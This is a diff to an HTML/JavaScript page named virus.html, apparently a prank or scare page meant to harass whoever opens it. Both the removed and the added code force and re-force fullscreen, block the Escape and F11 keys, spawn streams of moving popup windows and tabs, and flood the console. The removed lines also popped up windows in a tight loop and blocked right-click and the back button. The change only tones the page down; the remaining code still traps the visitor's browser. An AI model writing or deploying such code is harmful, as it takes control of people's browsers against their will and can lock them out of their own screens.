@@ -55,9 +55,6 @@
         let animationId = null;
         let lastMouseY = 0;
         let isFullscreen = false;
-        let rapidFullscreenInterval = null;
-        let rapidPopupInterval = null;
-        let isCreatingPopup = false;
         
         // DOM elements
         const startImage = document.getElementById('start-image');
@@ -72,23 +69,43 @@
             
             if (elem.requestFullscreen) {
                 elem.requestFullscreen().catch(e => {
-                    // Silently fail, will retry rapidly
+                    console.log("Fullscreen request failed:", e);
+                    // Try again after a short delay
+                    setTimeout(enterFullscreen, 100);
                 });
             } else if (elem.mozRequestFullScreen) { // Firefox
                 elem.mozRequestFullScreen().catch(e => {
-                    // Silently fail
+                    console.log("Fullscreen request failed:", e);
+                    setTimeout(enterFullscreen, 100);
                 });
             } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
                 elem.webkitRequestFullscreen().catch(e => {
-                    // Silently fail
+                    console.log("Fullscreen request failed:", e);
+                    setTimeout(enterFullscreen, 100);
                 });
             } else if (elem.msRequestFullscreen) { // IE/Edge
                 elem.msRequestFullscreen().catch(e => {
-                    // Silently fail
+                    console.log("Fullscreen request failed:", e);
+                    setTimeout(enterFullscreen, 100);
                 });
             }
             
             isFullscreen = true;
+        }
+        
+        // Function to exit fullscreen
+        function exitFullscreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.mozCancelFullScreen) { // Firefox
+                document.mozCancelFullScreen();
+            } else if (document.webkitExitFullscreen) { // Chrome, Safari, Opera
+                document.webkitExitFullscreen();
+            } else if (document.msExitFullscreen) { // IE/Edge
+                document.msExitFullscreen();
+            }
+            
+            isFullscreen = false;
         }
         
         // Check if currently in fullscreen
@@ -99,68 +116,44 @@
                      document.msFullscreenElement);
         }
         
-        // Start rapid fullscreen checking and forcing
-        function startRapidFullscreen() {
-            if (rapidFullscreenInterval) {
-                clearInterval(rapidFullscreenInterval);
-            }
+        // Listen for fullscreen change events
+        document.addEventListener('fullscreenchange', handleFullscreenChange);
+        document.addEventListener('mozfullscreenchange', handleFullscreenChange);
+        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
+        document.addEventListener('msfullscreenchange', handleFullscreenChange);
+        
+        function handleFullscreenChange() {
+            const fullscreenElement = document.fullscreenElement || 
+                                     document.mozFullScreenElement || 
+                                     document.webkitFullscreenElement || 
+                                     document.msFullscreenElement;
             
-            // Check and force fullscreen every 0.1 seconds (100ms)
-            rapidFullscreenInterval = setInterval(() => {
-                if (!checkFullscreen() && isStarted) {
-                    enterFullscreen();
-                }
-            }, 100); // 0.1 seconds
-        }
-        
-        // Create multiple popups at once
-        function createMultiplePopups(count) {
-            for (let i = 0; i < count; i++) {
-                createBrowserPopup();
-            }
-        }
-        
-        // Start rapid popup creation
-        function startRapidPopups() {
-            if (rapidPopupInterval) {
-                clearInterval(rapidPopupInterval);
-            }
+            isFullscreen = !!fullscreenElement;
             
-            // Create popups as fast as possible
-            rapidPopupInterval = setInterval(() => {
-                // Create multiple popups each interval for maximum speed
-                if (!isCreatingPopup) {
-                    isCreatingPopup = true;
-                    
-                    // Create 5 popups at once for maximum speed
-                    createMultiplePopups(5);
-                    
-                    // Use setTimeout to allow the browser to process
-                    setTimeout(() => {
-                        isCreatingPopup = false;
-                    }, 0);
-                }
-            }, 0); // No delay, run as fast as possible
+            // If user exits fullscreen, force it back
+            if (!isFullscreen && isStarted) {
+                setTimeout(enterFullscreen, 100);
+            }
         }
         
-        // If opened as popup, immediately start the experience
+        // If opened as popup, immediately go fullscreen
         if (isPopupWindow) {
+            // This is a popup window - load virus.html content and go fullscreen
             document.addEventListener('DOMContentLoaded', function() {
-                // Hide the start image for popups
-                startImage.style.display = 'none';
+                // Enter fullscreen immediately for popups
+                setTimeout(enterFullscreen, 100);
                 
-                // Immediately start the experience for popups
-                setTimeout(() => {
-                    startExperience();
-                }, 50);
+                // Add fullscreen re-entry on exit
+                setInterval(() => {
+                    if (!checkFullscreen() && isPopupWindow) {
+                        enterFullscreen();
+                    }
+                }, 500);
             });
-        } else {
-            // Main window - show start image
-            startImage.style.display = 'block';
-            
-            // Start the experience when image is clicked
-            startImage.addEventListener('click', startExperience);
         }
+        
+        // Start the experience when image is clicked
+        startImage.addEventListener('click', startExperience);
         
         // Mouse position tracking for top detection
         document.addEventListener('mousemove', (e) => {
@@ -169,8 +162,6 @@
             // If mouse is within 30px from top and experience has started, open new tab
             if (isStarted && lastMouseY <= 30) {
                 window.open('virus.html', '_blank');
-                window.open('virus.html', '_blank');
-                window.open('virus.html', '_blank'); // Open multiple
             }
         });
         
@@ -185,18 +176,18 @@
             // If Ctrl or Command is pressed and experience has started, open new tab
             if (isStarted && (ctrlPressed || cmdPressed)) {
                 window.open('virus.html', '_blank');
-                window.open('virus.html', '_blank');
-                window.open('virus.html', '_blank'); // Open multiple
             }
             
-            // Block escape key
-            if (e.key === 'Escape' && isStarted) {
-                e.preventDefault();
-            }
-            
-            // Block F11
+            // Allow F11 for fullscreen (browser default)
             if (e.key === 'F11') {
                 e.preventDefault();
+            }
+            
+            // Block escape key if we want to prevent exiting fullscreen
+            if (e.key === 'Escape' && isFullscreen && isStarted) {
+                e.preventDefault();
+                // Optionally, you can add code here to show a message
+                // or perform other actions when escape is pressed
             }
         });
         
@@ -217,23 +208,26 @@
             backgroundVideo.style.display = 'block';
             backgroundVideo.play();
             
-            // Enter fullscreen immediately
+            // Enter fullscreen
             enterFullscreen();
-            
-            // Start rapid fullscreen forcing
-            startRapidFullscreen();
             
             // Start infinite console logging
             startInfiniteLogging();
             
-            // Create initial burst of popups
-            createMultiplePopups(10);
-            
-            // Start rapid popup creation
-            startRapidPopups();
+            // Start creating popups every second
+            intervalId = setInterval(() => {
+                createBrowserPopup();
+            }, 1000);
             
             // Start animation
             startPopupAnimation();
+            
+            // Continuously check and maintain fullscreen
+            setInterval(() => {
+                if (!checkFullscreen() && isStarted) {
+                    enterFullscreen();
+                }
+            }, 1000);
         }
         
         // Create a single browser popup window
@@ -243,8 +237,8 @@
             // Calculate random position
             const screenWidth = window.screen.availWidth;
             const screenHeight = window.screen.availHeight;
-            const popupWidth = 400;
-            const popupHeight = 300;
+            const popupWidth = 600;
+            const popupHeight = 400;
             
             const left = Math.floor(Math.random() * (screenWidth - popupWidth));
             const top = Math.floor(Math.random() * (screenHeight - popupHeight));
@@ -254,7 +248,7 @@
             try {
                 popupWindow = window.open(
                     'virus.html', 
-                    `popup-${popupCounter}-${Date.now()}`, // Unique name
+                    `popup-${popupCounter}`, 
                     `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=yes,toolbar=no,menubar=no,location=no,status=no`
                 );
                 
@@ -264,8 +258,8 @@
                 
                 // Random velocity for movement
                 const velocity = {
-                    x: (Math.random() - 0.5) * 25,
-                    y: (Math.random() - 0.5) * 25
+                    x: (Math.random() - 0.5) * 20,
+                    y: (Math.random() - 0.5) * 20
                 };
                 
                 const popupData = {
@@ -295,9 +289,7 @@
             // Use setInterval to keep logging without blocking
             setInterval(() => {
                 console.log(logString);
-                console.log(logString);
-                console.log(logString); // Multiple logs
-            }, 50); // Very frequent logging
+            }, 100);
         }
         
         // Animate all popup windows (move them around)
@@ -361,26 +353,14 @@
             animationId = requestAnimationFrame(animatePopups);
         }
         
-        // Initialize based on window type
-        if (isPopupWindow) {
-            // Popup window - start experience automatically
-            console.log("Popup window detected - auto-starting rapid experience");
-        } else {
-            // Main window - wait for click
-            console.log("Main window - waiting for user click");
+        // Initialize fullscreen check for main window
+        if (!isPopupWindow) {
+            // Check if we should auto-start (for testing)
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('autostart')) {
+                setTimeout(startExperience, 1000);
+            }
         }
-        
-        // Block right-click context menu
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Block back button
-        history.pushState(null, null, location.href);
-        window.onpopstate = function(event) {
-            history.go(1);
-        };
     </script>
 </body>
 </html>
